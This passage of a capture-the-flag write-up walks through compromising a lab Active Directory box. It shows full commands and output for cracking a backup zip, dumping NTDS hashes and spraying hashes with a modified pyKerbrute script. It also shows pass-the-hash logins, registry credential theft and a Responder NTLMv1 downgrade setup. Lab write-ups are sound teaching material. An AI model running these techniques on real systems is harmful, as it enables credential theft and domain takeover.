<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «rpc-enum» «10.10.14.72»
$ nmap -p- --min-rate <span class=m>1000</span> -6 -v <span class=s1>&#39;dead:beef::b885:d62a:d679:573f&#39;</span>
...<span class=o>[</span>SNIP<span class=o>]</span>...
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
...<span class=o>[</span>SNIP<span class=o>]</span>...
</code></pre></div><h3 id=tcp-445---smb-ipv6>TCP 445 - SMB (IPv6)<a class=anchor aria-hidden=true href=#tcp-445---smb-ipv6>#</a></h3>
<p>Anonymous access is allowed on SMB. The <code>backup</code> share seems interesting here, so I will dig into that share.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «apt» «10.10.14.72» 
$ smbclient -N -L //apt 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
apt is an IPv6 address -- no workgroup available
</code></pre></div><p>In the <code>backup</code> share, there is a file called<code>backup.zip</code> . I will download it to my Kali.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «apt» «10.10.14.72» 
$ smbclient -N //apt/backup
Anonymous login successful
Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
smb: <span class=se>\&gt;</span> dir
  .                                   D        <span class=m>0</span>  Thu Sep <span class=m>24</span> 03:30:52 <span class=m>2020</span>
  ..                                  D        <span class=m>0</span>  Thu Sep <span class=m>24</span> 03:30:52 <span class=m>2020</span>
  backup.zip                          A <span class=m>10650961</span>  Thu Sep <span class=m>24</span> 03:30:32 <span class=m>2020</span>

                <span class=m>10357247</span> blocks of size 4096. <span class=m>6964173</span> blocks available
smb: <span class=se>\&gt;</span> get backup.zip 
getting file <span class=se>\b</span>ackup.zip of size <span class=m>10650961</span> as backup.zip <span class=o>(</span>502.9 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 502.9 KiloBytes/sec<span class=o>)</span>
</code></pre></div><h4 id=zip-crack>Zip Crack<a class=anchor aria-hidden=true href=#zip-crack>#</a></h4>
<p>The backup file is protected with a password. So I will use <code>zip2john.py</code> to convert this <code>backup.zip</code> into crackable hash format, and then transfer the hash to my Windows for cracking.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «loot» «10.10.14.72» 
$ zip2john backup.zip &gt; backup.zip.hash
→ root@iamf «loot» «10.10.14.72» 
$ cat backup.zip.hash 
backup.zip:<span class=nv>$pkzip2$3</span>*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip
</code></pre></div><p><code>Jtr</code> recovers the password to<code>iloveyousomuch</code> instantly. Now I can unzip the backup file.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>C:\tools\john\run&gt; ./john.exe hashes/backup.zip.hash --wordlist=C:/tools/rockyou.txt

...[SNIP]...
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE (2021-04-15 08:29) 35.71g/s 585142p/s 585142c/s 585142C/s 123456..christal
</code></pre></div><p>This backup contains AD database.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «loot» «10.10.14.72» 
$ tree
.
├── Active Directory
│   ├── ntds.dit
│   └── ntds.jfm
└── registry
    ├── SECURITY
    └── SYSTEM
</code></pre></div><h4 id=dumping-ntlm-hashes>Dumping NTLM Hashes<a class=anchor aria-hidden=true href=#dumping-ntlm-hashes>#</a></h4>
<p><code>ntds.dit</code> is a database file for Active Directory environment, I can supply the <code>SECURITY</code> and <code>SYSTEM</code> files to <code>secretsdump.py</code> to extract all the NTLM hashes of all the available AD user accounts.</p>
<blockquote>
<p>NTDS stands for New Technology Directory Service and DIT stands for directory information tree.</p>
</blockquote>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «loot» «10.10.14.72» 
$ secretsdump.py -ntds Active<span class=se>\ </span>Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL &gt; ad_hashes
</code></pre></div><p>I saved the hash to a file called <code>ad_hashes</code>.</p>
<h3 id=tcp-88---kerberos>TCP 88 - Kerberos<a class=anchor aria-hidden=true href=#tcp-88---kerberos>#</a></h3>
<h4 id=finding-valid-usernames>Finding Valid Usernames<a class=anchor aria-hidden=true href=#finding-valid-usernames>#</a></h4>
<p>Because there are so many data to try, I might accidentally get locked out if spraying blindly. But, with tools called <a href=https://github.com/ropnop/kerbrute>Kerbrute</a>, I can enumerate for valid users. The tools uses Kerberos pre-auth to determine a valid user.</p>
<p>If the user is a valid user, KDC returns <code>UF_DONT_REQUIRE_PREAUTH</code>. If it’s not, it returns <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>.</p>
<p>Before that, I&rsquo;ll pull the users and NTLM hash from <code>ad_hashes</code> and store them in separate list. I&rsquo;ll feed <code>users.list</code> to <code>kerbrute</code>.</p>
<p><code>users.list</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «loot» «10.10.14.72» 
$ cat ad_hashes <span class=p>|</span> grep <span class=s1>&#39;aad3b435b51404eeaad3b435b51404ee&#39;</span> <span class=p>|</span> cut -d : -f1 &gt; ../users.list
</code></pre></div><p><code>userhash.list</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «loot» «10.10.14.72» 
$ cat ad_hashes <span class=p>|</span> grep <span class=s1>&#39;aad3b435b51404eeaad3b435b51404ee&#39;</span> <span class=p>|</span> cut -d : -f4 &gt; ../userhash.list
</code></pre></div><p>I ran <code>kerbrute</code>, and after some time, it returned three legitimate users.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ kerbrute userenum  --dc apt --domain htb.local users.list

...<span class=o>[</span>SNIP<span class=o>]</span>...
2021/04/14 22:02:35 &gt;  Using KDC<span class=o>(</span>s<span class=o>)</span>:
2021/04/14 22:02:35 &gt;   apt:88

2021/04/14 22:03:12 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:       APT<span class=nv>$@</span>htb.local
2021/04/14 22:03:12 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:       Administrator@htb.local
2021/04/14 22:07:31 &gt;  <span class=o>[</span>+<span class=o>]</span> VALID USERNAME:       henry.vinson@htb.local
2021/04/14 22:15:52 &gt;  Done! Tested <span class=m>2001</span> usernames <span class=o>(</span><span class=m>3</span> valid<span class=o>)</span> in 796.320 second
</code></pre></div><p><code>APT$</code> is an account used for authentication purposes in the domain, it can not be used to login into the system. Because of that, I&rsquo;ll only keep <code>administrator</code> and <code>henry.vinson</code> on the list of valid users. But if I have a valid NT hash of this account, that would be very useful as it can be used for DCSync attack.</p>
<h4 id=hash-brute-force>Hash Brute-force<a class=anchor aria-hidden=true href=#hash-brute-force>#</a></h4>
<p>Using <code>henry.vinson:2de80758521541d19cabba480b260e8f</code> pair returns an authorization error message.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72»
$ evil-winrm -i apt -u henry.vinson -H 2de80758521541d19cabba480b260e8f

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of <span class=nb>type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code <span class=m>1</span>
</code></pre></div><p>Another option is to spray the NTLM hashes on <code>henry.vinson</code>.</p>
<p>Unfortunately, <code>kerbrute</code> doesn&rsquo;t support pass-the-hash yet. But there is a Python version of <code>kerbrute</code> called <code>pyKerbrute</code>. One of its tools called <code>ADPwdSpray.py</code> supports bruteforcing with hash.</p>
<ul>
<li><a href=https://github.com/3gstudent/pyKerbrute>https://github.com/3gstudent/pyKerbrute</a></li>
</ul>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ git clone https://github.com/3gstudent/pyKerbrute.git
</code></pre></div><p>By default, it only supports a single hash, so I’ve modified it a bit to work with a list of hashes and IPv6.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=o>...</span><span class=p>[</span><span class=n>SNIP</span><span class=p>]</span><span class=o>...</span>
<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
        <span class=n>kdc_a</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=c1># apt</span>
        <span class=n>user_realm</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span> <span class=c1># htb.local</span>
        <span class=n>user_name</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=c1># henry.vinson, administrator</span>
        <span class=n>hashes</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span> <span class=c1># aad3...hashes</span>
        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[*] DomainControlerAddr: </span><span class=si>%s</span><span class=s1>&#39;</span><span class=o>%</span><span class=p>(</span><span class=n>kdc_a</span><span class=p>))</span>
        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[*] DomainName:          </span><span class=si>%s</span><span class=s1>&#39;</span><span class=o>%</span><span class=p>(</span><span class=n>user_realm</span><span class=p>))</span>
        
        <span class=k>for</span> <span class=n>user_hash</span> <span class=ow>in</span> <span class=n>hashes</span><span class=p>:</span>
        	<span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\r</span><span class=s1>[*] Trying hash: </span><span class=si>%s</span><span class=s1>&#39;</span><span class=o>%</span><span class=p>(</span><span class=n>user_hash</span><span class=p>))</span> <span class=c1># to make sure it checks every hash in list</span>
        	<span class=n>user_key</span> <span class=o>=</span> <span class=p>(</span><span class=n>RC4_HMAC</span><span class=p>,</span> <span class=n>user_hash</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>))</span>
        	<span class=n>passwordspray_tcp</span><span class=p>(</span><span class=n>user_realm</span><span class=p>,</span> <span class=n>user_name</span><span class=p>,</span> <span class=n>user_key</span><span class=p>,</span> <span class=n>kdc_a</span><span class=p>,</span> <span class=n>user_hash</span><span class=p>)</span>
</code></pre></div><p>After a few minutes, it returns a valid hash that works on henry.vinson</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «pyKerbrute» «10.10.14.72» 
$ wc -c ../userhash.list 
<span class=m>66001</span> userhash.list

→ root@iamf «pyKerbrute» «10.10.14.72» git:<span class=o>(</span>temp<span class=o>)</span> ✗ 
$ python ADPwdSpray.py apt htb.local <span class=s1>&#39;henry.vinson&#39;</span> ../userhash.list <span class=p>|</span> tee ../pykerbrute-spray
<span class=o>[</span>*<span class=o>]</span> DomainControlerAddr: apt
<span class=o>[</span>*<span class=o>]</span> DomainName:          HTB.LOCAL

...<span class=o>[</span>SNIP<span class=o>]</span>...
<span class=o>[</span>+<span class=o>]</span> Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
</code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2>
<h3 id=shell-as-henryvinson_adm>Shell as henry.vinson_adm<a class=anchor aria-hidden=true href=#shell-as-henryvinson_adm>#</a></h3>
<h4 id=forwarding-ipv4---ipv6>Forwarding IPv4 -> IPv6<a class=anchor aria-hidden=true href=#forwarding-ipv4---ipv6>#</a></h4>
<p>Here, a relay or a port forwarding is required to make some tools work on IPv6. I came up with two solutions:</p>
<p>First, use socat.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ socat tcp-listen:445,fork tcp6:apt:445
</code></pre></div><p>Second, use ssh.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ ssh -L 445:apt:445 root@localhost -Nf

→ root@iamf «apt» «10.10.14.72» 
$ netstat -tlpn
Active Internet connections <span class=o>(</span>only servers<span class=o>)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:445           0.0.0.0:*               LISTEN      8548/ssh            
tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      8087/sshd: /usr/sbin 
tcp6       <span class=m>0</span>      <span class=m>0</span> ::1:445                 :::*                    LISTEN      8548/ssh 
</code></pre></div><p>I can confirm both forwarding options work by running <code>CrackMapExec</code> to localhost using <code>henry.vinson</code> creds</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ crackmapexec smb localhost -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb 
SMB         127.0.0.1       <span class=m>445</span>    APT              <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2016</span> Standard <span class=m>14393</span> <span class=o>(</span>name:APT<span class=o>)</span> <span class=o>(</span>domain:htb.local<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:True<span class=o>)</span>
SMB         127.0.0.1       <span class=m>445</span>    APT              <span class=o>[</span>+<span class=o>]</span> htb.local<span class=se>\h</span>enry.vinson e53d87d42adaa3ca32bdb34a876cbffb 
</code></pre></div><h4 id=registry-enumeration>Registry Enumeration<a class=anchor aria-hidden=true href=#registry-enumeration>#</a></h4>
<p><code>henry.vinson</code> can not be used to login remotely into the box.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ evil-winrm -i apt -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of <span class=nb>type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code <span class=m>1</span>
</code></pre></div><p>Instead, I can perform enumeration on the user registry using <code>reg.py</code> from Impacket.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ reg.py htb.local/henry.vinson@apt -hashes <span class=s1>&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU
Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span class=m>2020</span> SecureAuth Corporation

<span class=o>[</span>!<span class=o>]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU<span class=se>\C</span>onsole
HKU<span class=se>\C</span>ontrol Panel
HKU<span class=se>\E</span>nvironment
HKU<span class=se>\K</span>eyboard Layout
HKU<span class=se>\N</span>etwork
HKU<span class=se>\S</span>oftware
HKU<span class=se>\S</span>ystem
HKU<span class=se>\V</span>olatile Environment
</code></pre></div><p>Checking on <code>HKU\Software</code> is worth trying since some applications may store their credentials in a registry.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ reg.py htb.local/henry.vinson@apt -hashes <span class=s1>&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU<span class=se>\\</span>Software   
Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span class=m>2020</span> SecureAuth Corporation

<span class=o>[</span>!<span class=o>]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span class=se>\S</span>oftware
HKU<span class=se>\S</span>oftware<span class=se>\G</span>iganticHostingManagementSystem
HKU<span class=se>\S</span>oftware<span class=se>\M</span>icrosoft
HKU<span class=se>\S</span>oftware<span class=se>\P</span>olicies
HKU<span class=se>\S</span>oftware<span class=se>\R</span>egisteredApplications
HKU<span class=se>\S</span>oftware<span class=se>\V</span>Mware, Inc.
HKU<span class=se>\S</span>oftware<span class=se>\W</span>ow6432Node
HKU<span class=se>\S</span>oftware<span class=se>\C</span>lasses
</code></pre></div><p>The <code>HKU\Software\GiganticHostingManagementSystem</code> contains a set of credentials for username <code>henry.vinson_adm</code> and a password of <code>G1#Ny5@2dvht</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ reg.py htb.local/henry.vinson@apt -hashes <span class=s1>&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU<span class=se>\\</span>Software<span class=se>\\</span>GiganticHostingManagementSystem
Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span class=m>2020</span> SecureAuth Corporation

<span class=o>[</span>!<span class=o>]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span class=se>\S</span>oftware<span class=se>\G</span>iganticHostingManagementSystem
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht

</code></pre></div><h4 id=remote-access>Remote Access<a class=anchor aria-hidden=true href=#remote-access>#</a></h4>
<p><code>henry.vinson_adm</code> credentials can be used to gain a foothold on the system remotely. I’ll just grab the user flag.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «apt» «10.10.14.72» 
$ evil-winrm -i apt -u henry.vinson_adm -p <span class=s1>&#39;G1#Ny5@2dvht&#39;</span>                  

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\h</span>enry.vinson_adm<span class=se>\D</span>ocuments&gt; 
*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\h</span>enry.vinson_adm<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..<span class=se>\D</span>esktop
*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\h</span>enry.vinson_adm<span class=se>\D</span>esktop&gt; <span class=nb>type</span> user.txt
745212a817f60f27befd...<span class=o>[</span>SNIP<span class=o>]</span>...
</code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2>
<h3 id=shell-as-administrator>Shell as administrator<a class=anchor aria-hidden=true href=#shell-as-administrator>#</a></h3>
<h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4>
<p>Performing a text file enumeration finds a PowerShell history file.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>henry</span><span class=p>.</span><span class=n>vinson_adm</span><span class=p>&gt;</span> <span class=nb>gci </span><span class=n>-Path</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span> <span class=n>-filter</span> <span class=p>*.</span><span class=n>txt</span> <span class=n>-Recurse</span> <span class=n>-ErrorAction</span> <span class=n>SilentlyContinue</span> <span class=n>-Force</span>

<span class=p>...</span><span class=no>[SNIP]</span><span class=p>...</span>
    <span class=n>Directory</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>henry</span><span class=p>.</span><span class=n>vinson_adm</span><span class=p>\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>PowerShell</span><span class=p>\</span><span class=n>PSReadline</span>

<span class=n>Mode</span>                <span class=n>LastWriteTime</span>         <span class=n>Length</span> <span class=n>Name</span>
<span class=p>----</span>                <span class=p>-------------</span>         <span class=p>------</span> <span class=p>----</span>
<span class=n>-a</span><span class=p>----</span>       <span class=n>11</span><span class=p>/</span><span class=n>10</span><span class=p>/</span><span class=n>2020</span>  <span class=n>10</span><span class=err>:</span><span class=n>58</span> <span class=n>AM</span>            <span class=n>458</span> <span class=n>ConsoleHost_history</span><span class=p>.</span><span class=n>txt</span>

<span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>henry</span><span class=p>.</span><span class=n>vinson_adm</span><span class=p>&gt;</span> <span class=nb>type </span><span class=s2>&#34;C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&#34;</span>
<span class=nv>$Cred</span> <span class=p>=</span> <span class=nb>get-credential</span> <span class=n>administrator</span>
<span class=nb>invoke-command</span> <span class=n>-credential</span> <span class=nv>$Cred</span> <span class=n>-computername</span> <span class=n>localhost</span> <span class=n>-scriptblock</span> <span class=p>{</span><span class=nb>Set-ItemProperty</span> <span class=n>-Path</span> <span class=s2>&#34;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&#34;</span> <span class=n>lmcompatibilitylevel</span> <span class=n>-Type</span> <span class=n>DWORD</span> <span class=n>-Value</span> <span class=n>2</span> <span class=n>-Force</span><span class=p>}</span>
</code></pre></div><p>From Wikipedia:</p>
<blockquote>
<p><strong>Send NTLM response only</strong>: Clients use NTLM authentication only, and use NTLMv2 session security if server supports it; <strong>DCs accept LM,</strong> NTLM, and NTLMv2 authentication.</p>
</blockquote>
<p>With <code>lmcompatibilitylevel = 2</code>, it means the authentication process can be downgraded to NTLMv1. The attack is explained in detail <a href=https://book.hacktricks.xyz/windows/ntlm>here</a>.</p>
<p>There is a site called <a href=https://crack.sh>https://crack.sh</a> that provides a service for cracking NTLMv1 hash using <a href=https://en.wikipedia.org/wiki/Rainbow_table>rainbow tables</a> for a specific challenge of &ldquo;1122334455667788&rdquo;.</p>
<p>The idea here is to force APT to make a request (<em>challenge-response</em>) to the server that the attacker controls, which has been configured to send the string &ldquo;1122334455667788&rdquo; as the challenge (after downgrading the authentication process to NTLMv1).</p>
<p>After the server receives the response from the given challenge, I can send the NTLMv1 hash from that response to <a href=https://crack.sh>crack.sh</a> for cracking and obtain NTLM/NT hash of APT afterward.</p>
<blockquote>
<p>Note:</p>
<ul>
<li>NetNTLM/NTLMv1 is an authentication protocol</li>
<li>NetNTLM/NTLMv1 hash != NTLM hash</li>
<li>NetNTLM/NTLMv1 hash contains NTLM hash</li>
</ul>
</blockquote>
<h4 id=stealing-ntlmv1-hash-via-mpcmdrunexe>Stealing NTLMv1 hash via MpCmdRun.exe<a class=anchor aria-hidden=true href=#stealing-ntlmv1-hash-via-mpcmdrunexe>#</a></h4>
<p><code>MpCmdRun.exe</code> is part of Windows Defender that always runs with SYSTEM privileges. I can abuse this behavior to scan a file on my SMB server and capture the NTLMv1 authentication hash.</p>
<blockquote>
<p>This <a href=https://techcommunity.microsoft.com/t5/storage-at-microsoft/smb-and-null-sessions-why-your-pen-test-is-probably-wrong/ba-p/1185365>article</a> explaining how authentication proccess over SMB work</p>
</blockquote>
<p>For this, I’ll need to edit <code>/etc/responder/Responder.conf</code> first, and change the challenge from &ldquo;random&rdquo; to &ldquo;1122334455667788&rdquo;.</p>
<p>After that, I can start <code>Responder</code> to listen on my tun0 interface and specify the <code>--lm</code> option which will downgrade the authentication to NTLMv1.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@iamf «~» «10.10.14.72» 
$ responder -I tun0 --lm                                 
                                         __
  .----.-----.-----.-----.-----.-----.--<span class=p>|</span>  <span class=p>|</span>.-----.----.
  <span class=p>|</span>   _<span class=p>|</span>  -__<span class=p>|</span>__ --<span class=p>|</span>  _  <span class=p>|</span>  _  <span class=p>|</span>     <span class=p>|</span>  _  <span class=o>||</span>  -__<span class=p>|</span>   _<span class=p>|</span>
  <span class=p>|</span>__<span class=p>|</span> <span class=p>|</span>_____<span class=p>|</span>_____<span class=p>|</span>   __<span class=p>|</span>_____<span class=p>|</span>__<span class=p>|</span>__<span class=p>|</span>_____<span class=o>||</span>_____<span class=p>|</span>__<span class=p>|</span>
                   <span class=p>|</span>__<span class=p>|</span>

           NBT-NS, LLMNR <span class=p>&amp;</span> MDNS Responder 2.3.4.0

  Author: Laurent Gaffie <span class=o>(</span>laurent.gaffie@gmail.com<span class=o>)</span>
  To <span class=nb>kill</span> this script hit CTRL-C


<span class=o>[</span>+<span class=o>]</span> Poisoners:
    LLMNR                      <span class=o>[</span>ON<span class=o>]</span>
    NBT-NS                     <span class=o>[</span>ON<span class=o>]</span>
    DNS/MDNS                   <span class=o>[</span>ON<span class=o>]</span>

<span class=o>[</span>+<span class=o>]</span> Servers:
    HTTP server                <span class=o>[</span>ON<span class=o>]</span>
    HTTPS server               <span class=o>[</span>ON<span class=o>]</span>
    WPAD proxy                 <span class=o>[</span>OFF<span class=o>]</span>
    Auth proxy                 <span class=o>[</span>OFF<span class=o>]</span>
    SMB server                 <span class=o>[</span>ON<span class=o>]</span>
    Kerberos server            <span class=o>[</span>ON<span class=o>]</span>
    SQL server                 <span class=o>[</span>OFF<span class=o>]</span>
    FTP server                 <span class=o>[</span>OFF<span class=o>]</span>
    IMAP server                <span class=o>[</span>OFF<span class=o>]</span>
    POP3 server                <span class=o>[</span>OFF<span class=o>]</span>
    SMTP server                <span class=o>[</span>OFF<span class=o>]</span>
    DNS server                 <span class=o>[</span>ON<span class=o>]</span>
    LDAP server                <span class=o>[</span>ON<span class=o>]</span>
    RDP server                 <span class=o>[</span>OFF<span class=o>]</span>

<span class=o>[</span>+<span class=o>]</span> HTTP Options:
    Always serving EXE         <span class=o>[</span>OFF<span class=o>]</span>
    Serving EXE                <span class=o>[</span>OFF<span class=o>]</span>
    Serving HTML               <span class=o>[</span>OFF<span class=o>]</span>
    Upstream Proxy             <span class=o>[</span>OFF<span class=o>]</span>

<span class=o>[</span>+<span class=o>]</span> Poisoning Options:
    Analyze Mode               <span class=o>[</span>OFF<span class=o>]</span>
    Force WPAD auth            <span class=o>[</span>OFF<span class=o>]</span>
    Force Basic Auth           <span class=o>[</span>OFF<span class=o>]</span>
    Force LM downgrade         <span class=o>[</span>ON<span class=o>]</span>
    Fingerprint hosts          <span class=o>[</span>OFF<span class=o>]</span>

<span class=o>[</span>+<span class=o>]</span> Generic Options:
    Responder NIC              <span class=o>[</span>tun0<span class=o>]</span>
    Responder IP               <span class=o>[</span>10.10.14.72<span class=o>]</span>
    Challenge <span class=nb>set</span>              <span class=o>[</span>1122334455667788<span class=o>]</span>
    Don<span class=s1>&#39;t Respond To Names     [&#39;</span>ISATAP<span class=err>&#39;</span><span class=o>]</span>
<span class=o>[</span>+<span class=o>]</span> Listening <span class=k>for</span> events...
</code></pre></div><p>Now on APT, I can force authentication with <code>MpCmdRun.exe</code> (located on <code>C:\Program Files\Windows Defender</code>), and it errors out.</p>
